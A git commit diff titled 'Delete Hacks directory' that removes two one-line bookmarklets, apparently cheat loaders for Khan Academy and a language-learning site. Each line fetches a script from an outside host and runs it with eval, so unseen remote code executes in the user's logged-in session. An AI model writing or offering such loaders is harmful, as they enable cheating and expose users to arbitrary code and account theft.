d9cf88946f8fe23766abe7aa528a1ed6737fb93f
DarkMode <81440918+DarkMod3@users.noreply.github.com>
2024-10-20 04:39:26 -0300

    Delete Hacks directory

--- Hacks/KhanAcademy.js
+++
@@ -1,1 +0,0 @@
-javascript:fetch("https://proxy.khanware.space/estrogen.productions/p/raw/z6dwi4dw03").then(t=>t.text()).then(eval);
--- Hacks/SPeak.js
+++
@@ -1,1 +0,0 @@
-javascript:fetch(`https://res.cloudinary.com/dq36xqdoe/raw/upload/v${Math.floor(Math.random() * 1000000)}/main_oqidn5.js`).then(r => r.text()).then(r => eval(r))
